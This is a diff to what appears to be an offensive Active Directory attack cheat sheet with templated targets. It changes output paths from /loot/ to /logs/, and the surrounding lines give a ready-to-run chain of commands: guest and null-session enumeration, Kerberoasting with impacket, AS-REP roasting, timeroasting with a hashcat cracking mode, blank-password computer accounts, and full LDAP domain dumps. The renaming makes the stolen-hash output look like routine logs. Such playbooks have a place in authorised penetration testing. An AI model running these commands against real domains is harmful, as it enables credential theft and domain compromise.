@@ -16,7 +16,7 @@ nxc smb {{DC}} -u guest -p '' --shares            # null often denied while gues
 nxc ldap {{DC}} -u guest -p '' --users            # guest → LDAP → BloodHound
 # guest works? Kerberoast immediately, before any spray:
 impacket-GetUserSPNs {{DOMAIN}}/guest -no-pass -dc-ip {{DC}} -request
-nxc ldap {{DC}} -u '' -p '' --users --active-users --asreproast /loot/hashes/asrep.txt
+nxc ldap {{DC}} -u '' -p '' --users --active-users --asreproast /logs/hashes/asrep.txt
 
 enum4linux-ng -A {{DC}}
 
@@ -27,8 +27,8 @@ ldapsearch -x -H ldap://{{DC}} -s base namingContexts
 ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' '(objectClass=user)' sAMAccountName description
 
 # once you have ANY cred — offline dump
-ldeep ldap -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}} -s ldap://{{DC}} all /loot/enum/ldeep
-ldapdomaindump -u '{{DOMAIN}}\\{{USER}}' -p '{{PASS}}' {{DC}} -o /loot/enum/ldd
+ldeep ldap -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}} -s ldap://{{DC}} all /logs/enum/ldeep
+ldapdomaindump -u '{{DOMAIN}}\\{{USER}}' -p '{{PASS}}' {{DC}} -o /logs/enum/ldd
 
 dig axfr {{DOMAIN}} @{{NS}}
 nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 {{DC}}
@@ -36,7 +36,7 @@ nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 {{DC}
 # pre2k computer accounts (blank password)
 nxc smb {{DC}} -u computers.txt -p '' --no-bruteforce --continue-on-success
 # timeroast (no cred)
-nxc smb {{DC}} --timeroasting /loot/hashes/timeroast.txt
+nxc smb {{DC}} --timeroasting /logs/hashes/timeroast.txt
 # hashcat -m 31300 timeroast.txt
 
 ```
